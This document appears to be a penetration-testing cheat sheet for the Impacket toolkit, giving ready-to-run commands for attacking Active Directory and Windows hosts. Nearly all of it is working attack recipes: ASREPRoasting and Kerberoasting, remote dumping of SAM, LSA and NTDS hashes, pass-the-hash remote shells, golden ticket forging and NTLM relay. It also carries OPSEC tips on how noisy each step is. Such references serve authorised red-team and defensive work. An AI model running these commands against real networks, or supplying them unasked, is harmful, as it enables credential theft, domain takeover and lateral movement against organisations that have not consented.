# Impacket Cheat Sheet
> Python AD/SMB attack toolkit · AD/Windows · `pipx install impacket`

---

## Quick start
```bash
impacket-GetNPUsers corp.local/ -usersfile users.txt -no-pass -dc-ip 10.0.0.10   # ASREPRoast
impacket-GetUserSPNs corp.local/user:pass -dc-ip 10.0.0.10 -request              # Kerberoast
impacket-psexec corp.local/admin:pass@10.0.0.5                                   # remote shell
```

## Common tools
| Tool | Purpose |
|---|---|
| `GetNPUsers.py` | ASREPRoasting (users with no preauth required) |
| `GetUserSPNs.py` | Kerberoasting (request TGS for SPN accounts) |
| `secretsdump.py` | dump SAM/LSA/NTDS hashes remotely or from files |
| `psexec.py` / `wmiexec.py` / `smbexec.py` / `atexec.py` | remote command execution |
| `smbclient.py` | interactive SMB shell |
| `mssqlclient.py` | MSSQL client (supports xp_cmdshell) |
| `ticketer.py` | forge Kerberos tickets (golden/silver) |
| `lookupsid.py` | RID brute-force to enumerate users via SID |
| `ntlmrelayx.py` | NTLM relay attack server |

## Recipes
```bash
# Dump hashes remotely (needs admin creds)
impacket-secretsdump corp.local/admin:pass@10.0.0.5

# Dump from an offline NTDS.dit + SYSTEM hive
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL

# Pass-the-hash with wmiexec
impacket-wmiexec -hashes :ntlmhash corp.local/admin@10.0.0.5

# Golden ticket (needs krbtgt hash + domain SID)
impacket-ticketer -nthash <krbtgt_hash> -domain-sid <SID> -domain corp.local Administrator
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass corp.local/Administrator@dc.corp.local

# NTLM relay to SMB targets without signing enforced
impacket-ntlmrelayx -tf targets.txt -smb2support
```

## Recipes: enumeration
```bash
impacket-GetADUsers -all corp.local/user:pass -dc-ip 10.0.0.10
impacket-lookupsid corp.local/user:pass@10.0.0.10
```

## Gotchas / OPSEC
- `secretsdump.py` against a live DC triggers replication (DRSUAPI) — noisy, requires DA/replication rights.
- NTLM relay only works against hosts without SMB signing enforced — check with `nxc smb targets.txt --gen-relay-list relayable.txt` first.
- Kerberos ticket attacks (`ticketer.py`) need accurate clock sync with the DC (`ntpdate` first) or auth fails.

## See also
- https://github.com/fortra/impacket
- `ad-windows/netexec.md`, `ad-windows/bloodhound.md`, `passwords/hashcat.md`
